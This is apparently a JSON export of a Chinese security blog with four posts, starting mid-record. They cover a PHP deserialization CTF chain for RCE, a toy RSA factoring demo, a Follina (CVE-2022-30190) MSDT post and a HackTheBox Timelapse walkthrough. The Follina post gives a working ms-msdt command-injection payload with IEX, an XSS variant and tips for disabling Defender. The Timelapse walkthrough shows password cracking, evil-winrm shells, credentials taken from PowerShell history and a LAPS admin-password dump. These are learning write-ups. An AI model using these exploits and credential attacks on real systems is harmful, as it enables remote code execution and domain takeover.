serialize($a);\t//O:4:\u0026#34;Team\u0026#34;:1:{s:7:\u0026#34;players\u0026#34;;a:1:{i:0;O:6:\u0026#34;Person\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;N;s:2:\u0026#34;do\u0026#34;;N;}}} ?\u0026gt; class Person(__tostring($_POST['func']))和class Person(__tostring($_SERVER['HTTP_X_FORWARDED_FOR']))成功被控制，但是为什么没执行class Person(__destruct(($this-\u0026gt;do)($this-\u0026gt;info)))呢？我们可以发现连class Team(sayhello())的echo语句都没有执行，而且class Person($name)现在是空的，代表class Person(__tostring(return $this-\u0026gt;name;)也是返回了一个NULL。我们尝试给他随便赋一个值试试。\n//开始构造利用链 $a = new Team; $a-\u0026gt;players[]=new Person;\t//控制了players，间接让player = new Person，从而执行了class Person(__tostring()) $a-\u0026gt;players[0]-\u0026gt;name=\u0026#39;dayu\u0026#39;; echo serialize($a);\t//O:4:\u0026#34;Team\u0026#34;:1:{s:7:\u0026#34;players\u0026#34;;a:1:{i:0;O:6:\u0026#34;Person\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;dayu\u0026#34;;s:2:\u0026#34;do\u0026#34;;N;}}} 成功rce\n我们注意到class Person(__wakeup())被触发了，但是后面通过class Person(__tostring($_POST['func']))覆盖了$do。\n","permalink":"https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_1/","summary":"简介 不会php。\nhttps://www.php.net/manual/zh/language.oop5.serialization.php\n\u0026lt;?php class A { public $one = 1; public $two = \u0026#39;2\u0026#39;; public function show_one() { echo $this-\u0026gt;one; } } $a = new A; $s = serialize($a); echo $s;\tO:1:\u0026#34;A\u0026#34;:2:{s:3:\u0026#34;one\u0026#34;;i:1;s:3:\u0026#34;two\u0026#34;;s:1:\u0026#34;2\u0026#34;;} ?\u0026gt; https://www.toolnb.com/tools/phpserialize.html\n序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。\nO:1:\u0026#34;A\u0026#34;:2:{s:3:\u0026#34;one\u0026#34;;i:1;s:3:\u0026#34;two\u0026#34;;s:1:\u0026#34;2\u0026#34;;} object(__PHP_Incomplete_Class)#5 (3) { [\u0026#34;__PHP_Incomplete_Class_Name\u0026#34;]=\u0026gt; string(1) \u0026#34;A\u0026#34; [\u0026#34;one\u0026#34;]=\u0026gt; int(1) [\u0026#34;two\u0026#34;]=\u0026gt; string(1) \u0026#34;2\u0026#34; } 序列化就是将对象转换成字符串来存储，反序列化就是将字符串还原为对象。\nphp通过serialize()和unserialize()来进行序列化操作。\n其中有几个魔术方法需要关注一下。\nhttps://www.php.net/manual/zh/language.oop5.magic.php\n魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。\n__construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __toString() //当一个对象被当作一个字符串使用 __sleep() //在对象被序列化之前运行 __wakeup() //在对象被反序列化之后被调用 简单的序列化 [NPUCTF2020]ReadlezPHP\n\u0026lt;?php #error_reporting(0); highlight_file(__FILE__); echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; class HelloPhp { public $a; public $b; public function __construct(){ $this-\u0026gt;a = \u0026#34;Y-m-d h:i:s\u0026#34;; $this-\u0026gt;b = \u0026#34;date\u0026#34;; echo \u0026#39;__construct $this-\u0026gt;a: \u0026#39;.","title":"php_反序列化_1"},{"content":"简介 RSA算法是一种非对称算法，即公钥和密钥不相同，本质是利用2个大素数的乘积难以做因素分解。\n算法 RSA算法的密钥由3个数构成N，d，e\nN由2个互不相同的素数的乘积构成 $$ N=pq $$\n根据欧拉函数，求得r，即小于N且与N互质的数的个数。 $$ {\\displaystyle r=\\varphi (N)=(p-1)(q-1)} $$\n选择其中的一个质数为e，找到一个数 d。 $$ ed \\bmod r=1 $$\n现在N，d，e都已经拿到了，公钥是(N, e)，私钥是(N, d)。那么N和e就是公开的，而d是保密的。\n测试 然后就能使用公钥加密数据，然后私钥解密数据了。\n首先我们先选2个素数来算出N，我这里选择了3和5，那么N = 3 x 5 = 15\n那么r = (3 - 1) x (5 - 1) = 8，即15以内有8个数与它互质，他们分别是1，2，4，7，8，11，13，14。其中质数有2，7，11，13。\n这里选择11为e，根据(d x 11) % 8 = 1，求出d = 3\nd = 0 e = 11 r = 8 while(1): if ((d * e) % r == 1): print(d)\t//3 break d = d + 1 那么现在N = 15，e = 11，d = 3，公钥为(15, 11)，私钥为(15, 3)。\n既然有了密钥，那么现在开始对数据进行加密。(加密的数字必须小于N)\n加密公式 $$ 明文^{e} \\bmod N = 密文 $$\n解密公式 $$ 密文^{d} \\bmod N = 明文 $$\n尝试加解密\nN = 15 e = 11 d = 3 plaintext = 12 print(\u0026#34;明文为：\u0026#34;,plaintext) ciphertext = pow(plaintext, e, N) #加密 print(\u0026#34;密文为：\u0026#34;, ciphertext) test_plaintext = pow(ciphertext, d, N) #尝试解密 print(\u0026#34;解密出来的明文为：\u0026#34;, test_plaintext) \u0026#34;\u0026#34;\u0026#34; (venv) dayu@dayudeMacBook-Air test % python main.py 明文为： 12 密文为： 3 解密出来的明文为： 12 \u0026#34;\u0026#34;\u0026#34; Ok\n攻击 现在来分析rsa算法为什么难以攻击。\n我们来用python编写一个攻击上面密文的程序。作为中间人，已知：N = 15，e = 11，密文 = 3。\n首先想要解密我们得拿到d才能解密密文，先来梳理一下rsa流程：\n我们通过随机2个素数p = 3，q = 5，算出了N = pq = 15 然后通过欧拉公式得到r = (p - 1)(q - 1) = 8 然后随机从中挑选了一个质数e = 11，然后通过模逆元得到了d = 3。 反推流程：\n上面第3步在得知r的情况下，e和d是可以互推的，其中e是已知的。 如何来得到r？r是N欧拉公式的结果，涉及到了pq分别减1的乘积，其中N是公开的，由于算术基本定理，pq是唯一的素数因数。这里可以通过彩虹表的形式来得到pq，从而反解出r，再反解出d，拿到私钥。 代码如下：\ndef get_primes(maxnum): primes_list = [] for x in range(2, maxnum): i = 2 for i in range(2, x): if (x % i == 0): break else: primes_list.append(x) return primes_list def crack_primes(maxnum, N): primes_list = get_primes(maxnum) for p in primes_list: for q in primes_list: if p * q == N: return p,q N = 15 e = 11 ciphertext = 3 p, q = crack_primes(100,N) r = (p - 1) * (q - 1) for d in range(r): if ((d * e) % r == 1): break test_plaintext = pow(ciphertext, d, N) print(\u0026#34;p:\u0026#34;, p, \u0026#34;, q:\u0026#34;, q, \u0026#34;, d:\u0026#34;, d, \u0026#34;, 密文:\u0026#34;, test_plaintext) \u0026#34;\u0026#34;\u0026#34; (venv) dayu@dayudeMacBook-Air test % python main.py p: 3 , q: 5 , d: 3 , 密文: 12 \u0026#34;\u0026#34;\u0026#34; Success\n对极大整数做因数分解的难度决定了 RSA 算法的可靠性，上面用的pq才1位，现在可靠的RSA加密是2048位。\n一些思考和解答 算术基本定理：https://www.zhihu.com/question/490412529\nN的彩虹表：https://www.zhihu.com/question/537849302\n","permalink":"https://killdayu.com/posts/rsa%E7%AE%97%E6%B3%95/","summary":"简介 RSA算法是一种非对称算法，即公钥和密钥不相同，本质是利用2个大素数的乘积难以做因素分解。\n算法 RSA算法的密钥由3个数构成N，d，e\nN由2个互不相同的素数的乘积构成 $$ N=pq $$\n根据欧拉函数，求得r，即小于N且与N互质的数的个数。 $$ {\\displaystyle r=\\varphi (N)=(p-1)(q-1)} $$\n选择其中的一个质数为e，找到一个数 d。 $$ ed \\bmod r=1 $$\n现在N，d，e都已经拿到了，公钥是(N, e)，私钥是(N, d)。那么N和e就是公开的，而d是保密的。\n测试 然后就能使用公钥加密数据，然后私钥解密数据了。\n首先我们先选2个素数来算出N，我这里选择了3和5，那么N = 3 x 5 = 15\n那么r = (3 - 1) x (5 - 1) = 8，即15以内有8个数与它互质，他们分别是1，2，4，7，8，11，13，14。其中质数有2，7，11，13。\n这里选择11为e，根据(d x 11) % 8 = 1，求出d = 3\nd = 0 e = 11 r = 8 while(1): if ((d * e) % r == 1): print(d)\t//3 break d = d + 1 那么现在N = 15，e = 11，d = 3，公钥为(15, 11)，私钥为(15, 3)。","title":"RSA算法"},{"content":"CVE-2022-30190 虽迟但到\n刚起床，然后有事，就看了下这个洞，几天前就看见过这个洞了，但是我是个废物就懒的弄。\n漏洞原理 首先说一下自己对这个洞的理解，这个洞的本质就是msdt过滤的问题，导致msdt协议可以执行powershell代码。\n但是这个洞为什么个Office能关联上呢？\n因为Office在打开docx的时候可以加载一个web网页，然后web网页就能调用msdt协议，问题的关键就在于旧版本的Office在调用msdt协议的时候默认同意，而新版本则不同意，然后msdt绕过过滤就能执行powershell了。旧版本的Office应该是2013到2021 ltsc以下的，我用的2016复现成功，2021 pro plus则不行。\n其实也不需要配合Office，浏览器就行，只不过需要手动点一下同意调用，这里可以直接利用xss，嘿嘿嘿。\n漏洞代码 https://paper.seebug.org/1913/\nExp:\nC:\\Windows\\system32\\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \u0026#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(\u0026#39;mspaint.exe\u0026#39;))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \u0026#34; 一看这个exp就是为了绕过某种限制。\n$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(\u0026#34;$\u0026#34;, \u0026#34;$\u0026#34;)\t//没修复的 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(\u0026#34;`$\u0026#34;, \u0026#34;``$\u0026#34;)\t//修复过的 可以利用github这个项目快速生成一个exp word文件\nhttps://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed\n漏洞测试 直接cmd运行一下这个\nC:\\Windows\\system32\\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \u0026#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(\u0026#39;mspaint.exe\u0026#39;))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \u0026#34; 如果能弹出画图就成功了，不能就是狗拦了或者系统打补丁了，Office也更不可能利用成功。\nOffice测试\n如果打开的时候有请求记录但是没弹出计算器那就是Office版本问题（cmd能执行成功的情况下）。\nOK\n漏洞环境 Office：2013-2021ltsc（大概是）\nWindows：卸载6月补丁，忘记kb号了，自己看看吧。关闭Defender，或者回退旧版本。\n差不多就这样。\n一些发现 可以直接配合xss，点击即上线。\n\u0026lt;script\u0026gt; location.href = \u0026#34;ms-msdt:/id PCWDiagnostic /skip force /param \\\u0026#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(\u0026#39;mspaint.exe\u0026#39;))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \\\u0026#34;\u0026#34;; \u0026lt;/script\u0026gt; 擦不知道为啥没成功，以后再试试吧，Google了也没看见，按道理说应该可以的。。。\n感觉这个很难绕过，因为本质上我感觉是个逻辑漏洞，或许可以试试其他协议。\n漏洞绕过 将生成的docx文件另存为rtf即可绕过Office版本限制。\n","permalink":"https://killdayu.com/posts/cve_2022_30190_msdt_rce/","summary":"CVE-2022-30190 虽迟但到\n刚起床，然后有事，就看了下这个洞，几天前就看见过这个洞了，但是我是个废物就懒的弄。\n漏洞原理 首先说一下自己对这个洞的理解，这个洞的本质就是msdt过滤的问题，导致msdt协议可以执行powershell代码。\n但是这个洞为什么个Office能关联上呢？\n因为Office在打开docx的时候可以加载一个web网页，然后web网页就能调用msdt协议，问题的关键就在于旧版本的Office在调用msdt协议的时候默认同意，而新版本则不同意，然后msdt绕过过滤就能执行powershell了。旧版本的Office应该是2013到2021 ltsc以下的，我用的2016复现成功，2021 pro plus则不行。\n其实也不需要配合Office，浏览器就行，只不过需要手动点一下同意调用，这里可以直接利用xss，嘿嘿嘿。\n漏洞代码 https://paper.seebug.org/1913/\nExp:\nC:\\Windows\\system32\\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \u0026#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(\u0026#39;mspaint.exe\u0026#39;))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \u0026#34; 一看这个exp就是为了绕过某种限制。\n$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(\u0026#34;$\u0026#34;, \u0026#34;$\u0026#34;)\t//没修复的 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(\u0026#34;`$\u0026#34;, \u0026#34;``$\u0026#34;)\t//修复过的 可以利用github这个项目快速生成一个exp word文件\nhttps://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed\n漏洞测试 直接cmd运行一下这个\nC:\\Windows\\system32\\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \u0026#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(\u0026#39;mspaint.exe\u0026#39;))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \u0026#34; 如果能弹出画图就成功了，不能就是狗拦了或者系统打补丁了，Office也更不可能利用成功。\nOffice测试\n如果打开的时候有请求记录但是没弹出计算器那就是Office版本问题（cmd能执行成功的情况下）。\nOK\n漏洞环境 Office：2013-2021ltsc（大概是）\nWindows：卸载6月补丁，忘记kb号了，自己看看吧。关闭Defender，或者回退旧版本。\n差不多就这样。\n一些发现 可以直接配合xss，点击即上线。\n\u0026lt;script\u0026gt; location.href = \u0026#34;ms-msdt:/id PCWDiagnostic /skip force /param \\\u0026#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(\u0026#39;mspaint.","title":"CVE_2022_30190_MSDT_RCE"},{"content":"其实昨天就写得差不多了，处理了点细节，今天又是下午2点才起床，明明我昨晚3点就睡了的，草。\n这篇文章不小心误删了，吓尿了。\n这是一个windows内网环境的一个靶机\n# Nmap 7.92 scan initiated Fri Apr 1 17:28:39 2022 as: nmap -sVC -p- -T4 -v -oN nmap/timelapse timelapse.htb Nmap scan report for timelapse.htb (10.10.11.152) Host is up (0.037s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-01 18:30:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 | tls-alpn: |_ http/1.1 |_http-title: Not Found |_ssl-date: 2022-04-01T18:31:48+00:00; +7h59m53s from scanner time. | ssl-cert: Subject: commonName=dc01.timelapse.htb | Issuer: commonName=dc01.timelapse.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-10-25T14:05:29 | Not valid after: 2022-10-25T14:25:29 | MD5: e233 a199 4504 0859 013f b9c5 e4f6 91c3 |_SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49692/tcp open msrpc Microsoft Windows RPC 58280/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-04-01T18:31:09 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 7h59m52s, deviation: 0s, median: 7h59m52s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 1 17:31:55 2022 -- 1 IP address (1 host up) scanned in 195.98 seconds 开放了139和445端口，smb服务\n用hydra爆破会出错，网上看了一下htb的机器都这样，貌似得需要旧版本的hydra smb库。\n┌──(kali㉿kali)-[~] └─$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.11.152 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purpose s (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-14 03:17:54 [INFO] Reduced number of tasks to 1 (smb does not like parallel connections) [DATA] max 1 task per 1 server, overall 1 task, 28688798 login tries (l:2/p:14344399), ~28688798 tries per task [DATA] attacking smb://10.10.11.152:445/ [ERROR] no reply from target smb://10.10.11.152:445/ 直接尝试guest用户匿名访问\n┌──(kali㉿kali)-[~] └─$ smbmap -u guest -p \u0026#34;\u0026#34; -H 10.10.11.152 [+] IP: 10.10.11.152:445 Name: 10.10.11.152 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON NO ACCESS Logon server share Shares READ ONLY SYSVOL NO ACCESS Logon server share 开放了IPC$和Shares，尝试访问\n┌──(kali㉿kali)-[~] └─$ smbclient \\\\\\\\10.10.11.152\\\\IPC$ -U guest\t#IPC$权限不够 1 ⨯ Enter WORKGROUP\\guest\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir NT_STATUS_INVALID_INFO_CLASS listing \\* ┌──(kali㉿kali)-[~] └─$ smbclient \\\\\\\\10.10.11.152\\\\Shares -U guest 130 ⨯ Enter WORKGROUP\\guest\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Mon Oct 25 11:39:15 2021 .. D 0 Mon Oct 25 11:39:15 2021 Dev D 0 Mon Oct 25 15:40:06 2021 HelpDesk D 0 Mon Oct 25 11:48:42 2021 6367231 blocks of size 4096. 1222161 blocks available smb: \\\u0026gt; cd Dev smb: \\Dev\\\u0026gt; dir . D 0 Mon Oct 25 15:40:06 2021 .. D 0 Mon Oct 25 15:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 11:46:42 2021 6367231 blocks of size 4096. 1342549 blocks available smb: \\Dev\\\u0026gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec) smb: \\Dev\\\u0026gt; cd .. smb: \\\u0026gt; cd HelpDesk smb: \\HelpDesk\\\u0026gt; dir . D 0 Mon Oct 25 11:48:42 2021 .. D 0 Mon Oct 25 11:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 10:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 10:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 10:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 10:57:44 2021 6367231 blocks of size 4096. 1341023 blocks available smb: \\HelpDesk\\\u0026gt; exit 找到了一个压缩包winrm_backup.zip，解压发现有密码。\n┌──(kali㉿kali)-[~] └─$ unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: skipping: legacyy_dev_auth.pfx incorrect password ┌──(kali㉿kali)-[~] └─$ zip2john winrm_backup.zip \u0026gt; zip_hash 82 ⨯ Created directory: /home/kali/.john ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa t ype=8 ┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:00 DONE (2022-06-14 03:30) 4.761g/s 16540Kp/s 16540Kc/s 16540KC/s suzyqzb..superkebab Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. 将zip 转化为hash，然后用john爆破,拿到密码supremelegacy。尝试解压，得到了一个legacyy_dev_auth.pfx文件。\n发现还是有密码。\n继续爆破\n┌──(kali㉿kali)-[~] └─$ pfx2john legacyy_dev_auth.pfx \u0026gt; pfx_hash ┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:00:21 DONE (2022-06-14 03:37) 0.04668g/s 150875p/s 150875c/s 150875C/s thumper1990..thsco04 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. 拿到密码thuglegacy，打开看看里面有啥。\n一个私钥和证书但是不知道为啥只能导出证书。那就直接用openssl来导出。\n┌──(kali㉿kali)-[~] └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem Enter Import Password: Enter PEM pass phrase: Verifying - Enter PEM pass phrase: ┌──(kali㉿kali)-[~] └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem Enter Import Password: 私钥提取出来的指纹一样，可以确定提取成功了。\n查看证书\n用于某种客户端验证，再结合压缩包名称winrm_backup.zip可以确定是winrm的证书和私钥了，同时主机也开放了5986端口。\n直接用evil-winrm打。这里用kali自带的evil-winrm碰见了一个坑，用官网的安装方法覆盖安装一下就行了。\nhttps://github.com/Hackplayers/evil-winrm\ngem install evil-winrm ┌──(kali㉿kali)-[~] └─$ evil-winrm -i 10.10.11.152 -S -k key.pem -c cert.pem -p -u Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for Reline:Module Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; whoami timelapse\\legacyy 看样子是个低权，准备提权。\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; upload /home/kali/winPEASx64.exe Info: Uploading /home/kali/winPEASx64.exe to C:\\Users\\legacyy\\Documents\\winPEASx64.exe Data: 2581844 bytes of 2581844 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; dir Directory: C:\\Users\\legacyy\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 6/14/2022 9:09 AM 1916212 winPEASx64.exe *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; ./winPEASx64.exe Program \u0026#39;winPEASx64.exe\u0026#39; failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted soft wareAt line:1 char:1 + ./winPEASx64.exe + ~~~~~~~~~~~~~~~~. At line:1 char:1 + ./winPEASx64.exe + ~~~~~~~~~~~~~~~~ + CategoryInfo : ResourceUnavailable: (:) [], ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed 擦，被杀了。懒的做免杀了，直接睡觉，然后做梦，然后我梦见了这个，powershell的历史命令。\n%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt 😋，打开看看里面有啥。\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; type C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history. txt whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39; -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential (\u0026#39;svc_deploy\u0026#39;, $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; 好家伙，我tm直接好家伙，用户名密码直接给我了。\nsvc_deploy:E3R$Q62^12p7PLlC%KWaxuaV\n用evil-winrm登录\n┌──(kali㉿kali)-[~] └─$ evil-winrm -i 10.10.11.152 -S -u svc_deploy -p \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39; Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for Reline:Module Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ==================== ============================================ timelapse\\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group TIMELAPSE\\LAPS_Readers Group S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. 可以看见timelapse\\svc_deploy属于TIMELAPSE\\LAPS_Readers组。🤤不了解laps，貌似就是个管理密码的东西。\nhttps://adsecurity.org/?p=3164\ngoogle了一下这个组\nhttps://itconnect.uw.edu/wares/msinf/ous/laps/\n默认情况下，每个委派 OU 都有一个 LAPS 读者组，该组有权读取委派 OU 中所有计算机对象的密码。例如，Pottery OU 具有 u_msinf_delou_pottery_lapsreaders。每个 IT 支持组织都可以管理该组的成员资格，以授予或拒绝检索密码的能力。只有您的 OU 联系人组的成员才能管理您的 OU 的 LAPS 读者组。例如 Pottery OU Contacts 是 u_msinf_delou_pottery_oucontacts。要管理该组的成员，请导航到组服务，搜索您的 Laps Readers 组并根据需要添加/删除成员。 能读全部用户的密码，好耶😆。\n我也不会powershell，反正这样就读到密码了。。。\n*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u0026gt; get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like \u0026#39;*\u0026#39;} -prop \u0026#39;ms-mcs-admpwd\u0026#39; , \u0026#39;ms-mcs- admpwdexpirationtime\u0026#39; DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb DNSHostName : dc01.timelapse.htb Enabled : True ms-mcs-admpwd : #R[2u3+6c5-NSg\u0026amp;FBbmWixNP ms-mcs-admpwdexpirationtime : 133001240354127216 Name : DC01 ObjectClass : computer ObjectGUID : 6e10b102-6936-41aa-bb98-bed624c9b98f SamAccountName : DC01$ SID : S-1-5-21-671920749-559770252-3318990721-1000 UserPrincipalName : 读取到密码#R[2u3+6c5-NSg\u0026amp;FBbmWixNP\nEvil-winrm验证一下\n┌──(kali㉿kali)-[~] └─$ evil-winrm -i 10.10.11.152 -S -u Administrator -p \u0026#39;#R[2u3+6c5-NSg\u0026amp;FBbmWixNP\u0026#39; 6 ⚙ Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for Reline:Module Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami timelapse\\administrator Ok\u0026hellip;\n","permalink":"https://killdayu.com/posts/htb_timelapse/","summary":"其实昨天就写得差不多了，处理了点细节，今天又是下午2点才起床，明明我昨晚3点就睡了的，草。\n这篇文章不小心误删了，吓尿了。\n这是一个windows内网环境的一个靶机\n# Nmap 7.92 scan initiated Fri Apr 1 17:28:39 2022 as: nmap -sVC -p- -T4 -v -oN nmap/timelapse timelapse.htb Nmap scan report for timelapse.htb (10.10.11.152) Host is up (0.037s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 